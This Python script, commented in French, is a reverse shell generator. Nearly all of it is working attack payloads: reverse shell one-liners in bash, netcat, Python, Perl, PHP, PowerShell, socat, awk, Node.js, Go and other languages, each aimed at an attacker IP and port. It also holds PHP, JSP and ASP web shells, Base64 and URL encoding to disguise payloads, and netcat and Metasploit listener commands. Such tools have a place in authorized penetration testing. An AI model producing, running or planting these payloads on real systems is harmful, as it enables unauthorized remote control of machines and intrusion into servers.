#!/usr/bin/env python3
"""
Reverse Shell Generator
Génère des payloads de reverse shell pour différentes plateformes
Usage: python3 reverse_shell_gen.py <IP> <PORT> [options]
"""

import argparse
import base64
import urllib.parse
import sys

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    END = '\033[0m'
    BOLD = '\033[1m'

SHELLS = {
    "bash": {
        "name": "Bash TCP",
        "payload": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "description": "Simple Bash reverse shell"
    },
    "bash_udp": {
        "name": "Bash UDP",
        "payload": "sh -i >& /dev/udp/{ip}/{port} 0>&1",
        "description": "Bash reverse shell via UDP"
    },
    "nc": {
        "name": "Netcat Traditional",
        "payload": "nc -e /bin/sh {ip} {port}",
        "description": "Netcat avec option -e"
    },
    "nc_mkfifo": {
        "name": "Netcat MKFIFO",
        "payload": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "description": "Netcat sans -e (utilise mkfifo)"
    },
    "python": {
        "name": "Python",
        "payload": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "description": "Python reverse shell"
    },
    "python3": {
        "name": "Python3",
        "payload": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
        "description": "Python3 reverse shell avec PTY"
    },
    "perl": {
        "name": "Perl",
        "payload": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "description": "Perl reverse shell"
    },
    "php": {
        "name": "PHP",
        "payload": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "description": "PHP reverse shell"
    },
    "ruby": {
        "name": "Ruby",
        "payload": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "description": "Ruby reverse shell"
    },
    "java": {
        "name": "Java",
        "payload": "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()",
        "description": "Java reverse shell"
    },
    "powershell": {
        "name": "PowerShell",
        "payload": "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "description": "PowerShell reverse shell"
    },
    "powershell_short": {
        "name": "PowerShell One-liner",
        "payload": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        "description": "PowerShell one-liner"
    },
    "socat": {
        "name": "Socat",
        "payload": "socat TCP:{ip}:{port} EXEC:/bin/bash",
        "description": "Socat reverse shell"
    },
    "awk": {
        "name": "AWK",
        "payload": "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
        "description": "AWK reverse shell"
    },
    "lua": {
        "name": "Lua",
        "payload": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
        "description": "Lua reverse shell"
    },
    "nodejs": {
        "name": "Node.js",
        "payload": "(function(){{var net = require('net'),cp = require('child_process'),sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect({port}, '{ip}', function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();",
        "description": "Node.js reverse shell"
    },
    "telnet": {
        "name": "Telnet",
        "payload": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF",
        "description": "Telnet reverse shell"
    },
    "golang": {
        "name": "Golang",
        "payload": "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
        "description": "Golang reverse shell"
    }
}

WEB_SHELLS = {
    "php_web": {
        "name": "PHP Web Shell",
        "payload": "<?php system($_GET['cmd']); ?>",
        "description": "Simple PHP web shell (usage: shell.php?cmd=ls)"
    },
    "php_reverse": {
        "name": "PHP Reverse Shell",
        "payload": "<?php\n$ip = '{ip}';\n$port = {port};\n$sock = fsockopen($ip, $port);\n$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);\n?>",
        "description": "PHP reverse shell pour upload web"
    },
    "jsp_web": {
        "name": "JSP Web Shell",
        "payload": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
        "description": "Simple JSP web shell"
    },
    "asp_web": {
        "name": "ASP Web Shell",
        "payload": "<%\nSet oScript = Server.CreateObject(\"WSCRIPT.SHELL\")\nSet oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")\nSet oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")\nszCMD = Request.Form(\".CMD\")\nIf (szCMD <> \"\") Then\n    szTempFile = \"C:\\\\\" & oFileSys.GetTempName()\n    Call oScript.Run(\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)\n    Set oFile = oFileSys.OpenTextFile(szTempFile, 1, False, 0)\nEnd If\n%>",
        "description": "ASP web shell"
    }
}

def banner():
    print(f"{Colors.MAGENTA}{Colors.BOLD}")
    print("╔════════════════════════════════════════╗")
    print("║      Reverse Shell Generator v2.0      ║")
    print("║     Multi-Platform Payload Creator     ║")
    print("╚════════════════════════════════════════╝")
    print(f"{Colors.END}")

def list_shells():
    """Liste tous les shells disponibles"""
    print(f"\n{Colors.BOLD}{Colors.CYAN}Reverse Shells disponibles:{Colors.END}")
    for key, shell in SHELLS.items():
        print(f"  {Colors.GREEN}► {key:20s}{Colors.END} - {shell['name']:25s} - {Colors.YELLOW}{shell['description']}{Colors.END}")
    
    print(f"\n{Colors.BOLD}{Colors.CYAN}Web Shells disponibles:{Colors.END}")
    for key, shell in WEB_SHELLS.items():
        print(f"  {Colors.GREEN}► {key:20s}{Colors.END} - {shell['name']:25s} - {Colors.YELLOW}{shell['description']}{Colors.END}")

def generate_shell(shell_type, ip, port, encode=False, url_encode=False):
    """Génère un payload de reverse shell"""
    all_shells = {**SHELLS, **WEB_SHELLS}
    
    if shell_type not in all_shells:
        print(f"{Colors.RED}[!] Type de shell inconnu: {shell_type}{Colors.END}")
        print(f"{Colors.YELLOW}[*] Utilisez -l pour lister les shells disponibles{Colors.END}")
        return None
    
    shell = all_shells[shell_type]
    payload = shell['payload'].format(ip=ip, port=port)
    
    # Encodage Base64
    if encode:
        payload_bytes = payload.encode('utf-8')
        payload_b64 = base64.b64encode(payload_bytes).decode('utf-8')
        
        # Adapter selon le type
        if 'python' in shell_type:
            payload = f"echo {payload_b64} | base64 -d | python3"
        elif 'bash' in shell_type:
            payload = f"echo {payload_b64} | base64 -d | bash"
        elif 'php' in shell_type:
            payload = f"echo {payload_b64} | base64 -d | php"
        elif 'powershell' in shell_type:
            payload = f"powershell -enc {payload_b64}"
        else:
            return {"original": payload, "encoded": payload_b64}
    
    # URL encoding
    if url_encode:
        payload = urllib.parse.quote(payload)
    
    return {
        "name": shell['name'],
        "description": shell['description'],
        "payload": payload
    }

def generate_listener_command(port, shell_type=""):
    """Génère la commande listener appropriée"""
    listeners = {
        "nc": f"nc -lvnp {port}",
        "nc_verbose": f"nc -lvnp {port} -v",
        "socat": f"socat TCP-LISTEN:{port},reuseaddr,fork -",
        "ncat": f"ncat -lvnp {port}",
        "metasploit": f"use exploit/multi/handler\nset payload generic/shell_reverse_tcp\nset LHOST 0.0.0.0\nset LPORT {port}\nexploit"
    }
    
    print(f"\n{Colors.BOLD}{Colors.CYAN}Commandes Listener:{Colors.END}")
    for name, cmd in listeners.items():
        print(f"{Colors.GREEN}► {name:15s}{Colors.END}: {Colors.YELLOW}{cmd}{Colors.END}")

def generate_all_shells(ip, port, output_file=None):
    """Génère tous les shells disponibles"""
    print(f"\n{Colors.BOLD}Génération de tous les reverse shells...{Colors.END}\n")
    
    results = []
    all_shells = {**SHELLS, **WEB_SHELLS}
    
    for shell_type in all_shells.keys():
        shell = generate_shell(shell_type, ip, port)
        if shell:
            results.append({
                "type": shell_type,
                **shell
            })
            print(f"{Colors.GREEN}[+] {shell['name']}{Colors.END}")
    
    if output_file:
        with open(output_file, 'w') as f:
            f.write(f"# Reverse Shells for {ip}:{port}\n")
            f.write(f"# Generated by Reverse Shell Generator\n\n")
            
            for result in results:
                f.write(f"## {result['name']}\n")
                f.write(f"# {result['description']}\n")
                f.write(f"{result['payload']}\n\n")
        
        print(f"\n{Colors.GREEN}[+] Tous les shells sauvegardés dans: {output_file}{Colors.END}")
    
    return results

def main():
    parser = argparse.ArgumentParser(
        description="Reverse Shell Generator - Génère des payloads pour différentes plateformes"
    )
    parser.add_argument("ip", nargs='?', help="Adresse IP de l'attaquant")
    parser.add_argument("port", nargs='?', type=int, help="Port d'écoute")
    parser.add_argument("-t", "--type", help="Type de shell (ex: bash, python, php)")
    parser.add_argument("-l", "--list", action="store_true", 
                       help="Lister tous les shells disponibles")
    parser.add_argument("-e", "--encode", action="store_true",
                       help="Encoder le payload en Base64")
    parser.add_argument("-u", "--url-encode", action="store_true",
                       help="URL encoder le payload")
    parser.add_argument("-a", "--all", action="store_true",
                       help="Générer tous les shells disponibles")
    parser.add_argument("-o", "--output", help="Fichier de sortie pour sauvegarder les payloads")
    parser.add_argument("--listener", action="store_true",
                       help="Afficher les commandes listener")
    
    args = parser.parse_args()
    
    banner()
    
    # Liste des shells
    if args.list:
        list_shells()
        return
    
    # Vérifier les arguments requis
    if not args.ip or not args.port:
        print(f"{Colors.RED}[!] IP et PORT requis (ou utilisez -l pour lister){Colors.END}")
        parser.print_help()
        sys.exit(1)
    
    print(f"{Colors.BLUE}[*] IP Attaquant: {args.ip}{Colors.END}")
    print(f"{Colors.BLUE}[*] Port: {args.port}{Colors.END}")
    
    # Commandes listener
    if args.listener:
        generate_listener_command(args.port)
    
    # Générer tous les shells
    if args.all:
        generate_all_shells(args.ip, args.port, args.output)
        return
    
    # Générer un shell spécifique
    if args.type:
        shell = generate_shell(args.type, args.ip, args.port, args.encode, args.url_encode)
        if shell:
            print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════{Colors.END}")
            print(f"{Colors.BOLD}{Colors.GREEN}Shell: {shell['name']}{Colors.END}")
            print(f"{Colors.YELLOW}Description: {shell['description']}{Colors.END}")
            print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════{Colors.END}")
            print(f"\n{Colors.BOLD}Payload:{Colors.END}")
            print(f"{Colors.YELLOW}{shell['payload']}{Colors.END}\n")
            
            if args.output:
                with open(args.output, 'w') as f:
                    f.write(shell['payload'])
                print(f"{Colors.GREEN}[+] Payload sauvegardé dans: {args.output}{Colors.END}")
            
            # Afficher les listeners
            print(f"\n{Colors.BOLD}Pour écouter, utilisez:{Colors.END}")
            print(f"{Colors.GREEN}nc -lvnp {args.port}{Colors.END}\n")
    else:
        print(f"{Colors.YELLOW}[*] Spécifiez un type avec -t ou utilisez -a pour tous{Colors.END}")
        print(f"{Colors.YELLOW}[*] Utilisez -l pour voir les types disponibles{Colors.END}")

if __name__ == "__main__":
    main()